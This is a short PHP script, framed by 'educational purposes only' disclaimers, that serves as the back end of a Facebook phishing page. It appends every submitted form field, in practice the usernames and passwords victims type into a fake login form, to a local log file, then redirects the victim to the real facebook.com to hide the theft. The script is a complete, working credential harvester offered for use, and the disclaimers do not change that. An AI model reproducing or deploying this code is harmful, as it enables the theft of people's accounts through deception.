<!-- This source code or script for educational purposes ONLY. 

How you use this information is your responsibility.

I will not be held accountable for any illegel activities. -->


<?php
 header('Location: https://www.facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
 	fwrite($handle, "=");
 	fwrite($handle, $value);
 	fwrite($handle, "\r\n");
 }
   fwrite($handle, "\r\n");
   fclose($handle);
   exit;
?>

<!-- This source code or script for educational purposes ONLY. 

How you use this information is your responsibility.

I will not be held accountable for any illegel activities. -->
